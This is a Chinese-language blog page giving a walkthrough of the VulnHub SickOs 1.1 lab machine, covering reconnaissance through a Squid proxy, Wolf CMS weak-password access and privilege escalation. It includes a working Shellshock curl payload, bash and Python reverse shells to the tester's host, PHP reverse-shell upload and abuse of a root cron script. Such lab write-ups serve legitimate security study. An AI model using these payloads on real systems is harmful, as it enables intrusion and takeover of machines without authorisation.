@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"rerestst.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文内容纯属虚构！ 测试机IP地址：192.168.31.167 外部信息收集获取靶机地址$ sudo arp-scan -l 192.168.31.147 端口扫描Nmap结果： 123422&#x2F;tcp  open  ssh   syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.13128&#x2F;tcp open  http-proxy syn-ack ttl 6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SickOs1.1_VulnHub靶机攻略">
+<meta property="og:url" content="https://rerestst.github.io/2023/08/21/SickOs1.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/index.html">
+<meta property="og:site_name" content="rerestst&#39;s blog">
+<meta property="og:description" content="本文内容纯属虚构！ 测试机IP地址：192.168.31.167 外部信息收集获取靶机地址$ sudo arp-scan -l 192.168.31.147 端口扫描Nmap结果： 123422&#x2F;tcp  open  ssh   syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.13128&#x2F;tcp open  http-proxy syn-ack ttl 6">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-08-21T05:21:37.000Z">
+<meta property="article:modified_time" content="2024-01-09T04:30:46.441Z">
+<meta property="article:author" content="rerestst">
+<meta property="article:tag" content="VulnHub">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://rerestst.github.io/2023/08/21/SickOs1.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://rerestst.github.io/2023/08/21/SickOs1.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/","path":"2023/08/21/SickOs1.1_VulnHub靶机攻略/","title":"SickOs1.1_VulnHub靶机攻略"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SickOs1.1_VulnHub靶机攻略 | rerestst's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">rerestst's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">14</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">外部信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">1.0.1.</span> <span class="nav-text">获取靶机地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#squid"><span class="nav-number">1.0.3.</span> <span class="nav-text">squid</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BE%E7%BD%AEHTTP%E4%BB%A3%E7%90%86"><span class="nav-number">1.0.4.</span> <span class="nav-text">浏览器设置HTTP代理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.0.5.</span> <span class="nav-text">目录枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#wolfcms"><span class="nav-number">1.0.6.</span> <span class="nav-text">wolfcms</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-ShellShock%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.ShellShock破壳漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95Wolf-CMS%E5%B9%B6%E4%B8%8A%E4%BC%A0PHP-reverse-shell"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.弱口令登录Wolf CMS并上传PHP reverse shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">3.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%AF%86%E7%A0%81%E9%87%8D%E7%94%A8%EF%BC%8Csudo%E6%8F%90%E6%9D%83"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.密码重用，sudo提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%EF%BC%8Cpython%E6%96%87%E4%BB%B6%E5%8F%AF%E5%86%99"><span class="nav-number">3.0.2.</span> <span class="nav-text">2.定时任务，python文件可写</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">4.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#flag"><span class="nav-number">4.0.1.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%96%91%E9%97%AE%E6%B1%82%E5%8A%A9"><span class="nav-number">4.0.2.</span> <span class="nav-text">疑问求助</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rerestst"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">rerestst</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://rerestst.github.io/2023/08/21/SickOs1.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rerestst">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SickOs1.1_VulnHub靶机攻略 | rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SickOs1.1_VulnHub靶机攻略
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-08-21 13:21:37" itemprop="dateCreated datePublished" datetime="2023-08-21T13:21:37+08:00">2023-08-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-01-09 12:30:46" itemprop="dateModified" datetime="2024-01-09T12:30:46+08:00">2024-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">靶机攻略</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>本文内容纯属虚构！</p>
+<p>测试机IP地址：192.168.31.167</p>
+<h3 id="外部信息收集"><a href="#外部信息收集" class="headerlink" title="外部信息收集"></a>外部信息收集</h3><h5 id="获取靶机地址"><a href="#获取靶机地址" class="headerlink" title="获取靶机地址"></a>获取靶机地址</h5><p>$ sudo arp-scan -l</p>
+<p>192.168.31.147</p>
+<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>Nmap结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">22/tcp  open  ssh   syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.1</span><br><span class="line">3128/tcp open  http-proxy syn-ack ttl 64 Squid http proxy 3.1.19</span><br><span class="line">|_http-server-header: squid/3.1.19</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="squid"><a href="#squid" class="headerlink" title="squid"></a>squid</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search squid</span><br><span class="line">msf6 &gt; use auxiliary/scanner/http/squid_pivot_scanning</span><br><span class="line">&gt; set RPORT 3128</span><br><span class="line">&gt; set RHOSTS 192.168.0.10</span><br><span class="line">&gt; set RANGE 192.168.0.10</span><br><span class="line">msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; run</span><br><span class="line">[+] [192.168.0.10] 192.168.0.10 is alive.</span><br><span class="line">[+] [192.168.0.10] 192.168.0.10:80 seems open (HTTP 200, server header: &#x27;Apache/2.2.22 (Ubuntu)&#x27;).</span><br><span class="line">[-] [192.168.0.10] 192.168.0.10:443 unknown Squid proxy error: &#x27;ERR_UNSUP_REQ 0&#x27; (HTTP 501)</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="浏览器设置HTTP代理"><a href="#浏览器设置HTTP代理" class="headerlink" title="浏览器设置HTTP代理"></a>浏览器设置HTTP代理</h5><p>HTTP Proxy 192.168.31.147 3128</p>
+<p>且代理localhost和127.0.0.1</p>
+<p>&#x2F;</p>
+<p>burp配置上传流</p>
+<p>&#x2F;</p>
+<p>系统export http_proxy&#x3D;”<a target="_blank" rel="noopener" href="http://192.168.31.147:3128"(对fuff部分有效，对cURL有效，对nmap、nikto、浏览器未生效)">http://192.168.31.147:3128&quot;(对fuff部分有效，对cURL有效，对nmap、nikto、浏览器未生效)</a></p>
+<p>可访问<a target="_blank" rel="noopener" href="http://192.168.31.147/">http://192.168.31.147/</a></p>
+<h5 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.147/FUZZ -e .php,.txt,.html -c -ic -x http://192.168.31.147:3128</span><br><span class="line">/</span><br><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost/FUZZ -e .php,.txt,.html -c -ic -x http://192.168.31.147:3128</span><br></pre></td></tr></table></figure>
+
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">connect          [Status: 200,</span><br><span class="line">index        [Status: 200,</span><br><span class="line">index.php        [Status: 200,</span><br><span class="line">robots.txt       [Status: 200,</span><br><span class="line">robots         [Status: 200,</span><br><span class="line">/cgi-bin/        403</span><br><span class="line"></span><br><span class="line">robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Dissalow: /wolfcms</span><br><span class="line"></span><br><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost/cgi-bin/FUZZ -e .php,.txt,.html -c -ic -x http://192.168.31.147:3128</span><br><span class="line">status        [Status: 200,</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="wolfcms"><a href="#wolfcms" class="headerlink" title="wolfcms"></a>wolfcms</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">访问http://192.168.31.147/wolfcms/发现是博客</span><br><span class="line">文章管理osted by Administrator</span><br><span class="line"></span><br><span class="line">$ searchsploit wolfcms</span><br><span class="line">Wolfcms 0.75 - Cross-Site Request Forgery / Cross-Site Scripting   | php/webapps/18652.txt</span><br><span class="line">WolfCMS 0.8.3.1 - Cross-Site Request Forgery                       | php/webapps/44418.txt</span><br><span class="line">WolfCMS 0.8.3.1 - Open Redirection                  | php/webapps/44421.txt</span><br><span class="line"></span><br><span class="line">$ searchsploit wolf</span><br><span class="line">Wolf CMS - Arbitrary File Upload / Execution              | php/webapps/38000.txt</span><br><span class="line">Wolf CMS 0.6.0b - Multiple Vulnerabilities                         | php/webapps/15614.html</span><br><span class="line">Wolf CMS 0.7.5 - Multiple Vulnerabilities                          | php/webapps/18545.txt</span><br><span class="line">Wolf CMS 0.8.2 - Arbitrary File Upload                             | php/webapps/36818.php</span><br><span class="line">Wolf CMS 0.8.2 - Arbitrary File Upload (Metasploit)                | php/remote/40004.rb</span><br><span class="line"></span><br><span class="line">$ searchsploit -m 44421</span><br><span class="line">http://192.168.31.147/wolfcms/?/admin/login</span><br><span class="line">$ searchsploit -m 38000</span><br><span class="line">http://192.168.31.147/wolfcms/?/admin/plugin/file_manager/browse/</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h5 id="1-ShellShock破壳漏洞"><a href="#1-ShellShock破壳漏洞" class="headerlink" title="1.ShellShock破壳漏洞"></a>1.ShellShock破壳漏洞</h5><p>验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H &quot;user-agent: () &#123; : ;&#125;;echo;echo;/bin/bash -c &#x27;cat /etc/passwd&#x27;&quot; http://192.168.31.147/cgi-bin/status -x http://192.168.31.147:3128</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</span><br></pre></td></tr></table></figure>
+
+
+<p>getshell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 1233</span><br><span class="line">curl -H &quot;user-agent: () &#123; : ;&#125;;echo;echo;/bin/bash -i &amp;&gt;/dev/tcp/192.168.31.167/1233 &lt;&amp;1&quot; http://192.168.31.147/cgi-bin/status -x http://192.168.31.147:3128</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="2-弱口令登录Wolf-CMS并上传PHP-reverse-shell"><a href="#2-弱口令登录Wolf-CMS并上传PHP-reverse-shell" class="headerlink" title="2.弱口令登录Wolf CMS并上传PHP reverse shell"></a>2.弱口令登录Wolf CMS并上传PHP reverse shell</h5><p>使用admin:admin弱口令登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Wolf CMS 0.8.2</span><br><span class="line">Name：Aministrator</span><br><span class="line">Username：admin</span><br></pre></td></tr></table></figure>
+
+
+<p>上传PHP reverse shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">点Files标签，在/wolfcms/public/目录下创建php-reverse-shell：s.php，点权限改为777</span><br><span class="line">$ nc -nvlp 1234</span><br><span class="line">$ nc -nvlp 2345</span><br><span class="line"></span><br><span class="line">访问：http://192.168.31.147/wolfcms/public/s.php</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.31.167/2345 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>$ python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<h5 id="1-密码重用，sudo提权"><a href="#1-密码重用，sudo提权" class="headerlink" title="1.密码重用，sudo提权"></a>1.密码重用，sudo提权</h5><p>&#x2F;var&#x2F;www&#x2F;wolfcms&#x2F;config.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define(&#x27;DB_DSN&#x27;, &#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;);</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line">define(&#x27;DB_PASS&#x27;, &#x27;john@123&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+<p>密码重用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su sickos</span><br><span class="line">Password: john@123sudo</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sudo提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"></span><br><span class="line">sickos@SickOs:~$ sudo su</span><br><span class="line">root@SickOs:~# </span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="2-定时任务，python文件可写"><a href="#2-定时任务，python文件可写" class="headerlink" title="2.定时任务，python文件可写"></a>2.定时任务，python文件可写</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/var/www$ ls -al</span><br><span class="line">-rwxrwxrwx  1 root    root    109 Dec  5  2015 connect.py</span><br><span class="line"></span><br><span class="line">$ cat connect.py</span><br><span class="line">#!/usr/bin/python</span><br><span class="line">print &quot;I Try to connect things very frequently\n&quot;</span><br><span class="line">print &quot;You may want to try my services&quot;</span><br><span class="line"></span><br><span class="line">$ ls -alhR /etc/cron*</span><br><span class="line">/etc/cron.d:</span><br><span class="line">-rw-r--r--  1 root root  102 Jun 20  2012 .placeholder</span><br><span class="line">-rw-r--r--  1 root root   52 Dec  5  2015 automate</span><br><span class="line">-rw-r--r--  1 root root  544 Jul  2  2015 php5</span><br><span class="line"></span><br><span class="line">$ cat /etc/cron.d/automate</span><br><span class="line">* * * * * root /usr/bin/python /var/www/connect.py</span><br></pre></td></tr></table></figure>
+
+<p>改connect.py内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.31.167&quot;,1222))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h5 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># cat a*</span><br><span class="line">If you are viewing this!!</span><br><span class="line">ROOT!</span><br><span class="line">You have Succesfully completed SickOS1.1.</span><br><span class="line">Thanks for Trying</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="疑问求助"><a href="#疑问求助" class="headerlink" title="疑问求助"></a>疑问求助</h5><p>代理配置未完全理解，求教此题如何配置proxychains代理？</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/VulnHub/" rel="tag"># VulnHub</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/12/27/symfonos%206.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="prev" title="symfonos 6.1_VulnHub靶机攻略">
+                  <i class="fa fa-chevron-left"></i> symfonos 6.1_VulnHub靶机攻略
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/09/11/FristiLeaks1.3_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="next" title="FristiLeaks 1.3_VulnHub靶机攻">
+                  FristiLeaks 1.3_VulnHub靶机攻 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rerestst</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
